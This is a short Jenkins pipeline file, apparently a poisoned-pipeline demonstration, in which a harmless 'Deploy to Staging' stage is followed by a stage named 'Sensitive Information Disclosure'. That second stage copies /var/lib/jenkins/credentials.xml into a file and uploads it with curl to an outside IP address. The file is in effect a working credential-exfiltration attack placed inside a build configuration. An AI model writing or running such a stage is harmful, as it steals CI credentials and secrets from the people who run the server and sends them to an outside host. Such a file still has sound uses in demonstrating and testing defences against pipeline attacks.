node {
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Sensitive Information Disclosure') {
        sh '''
        rm info.txt | true
        cat /var/lib/jenkins/credentials.xml >> info.txt
        curl -i -X PUT http://35.219.132.125:5000/filewebhook --upload-file info.txt
        '''
    }
}
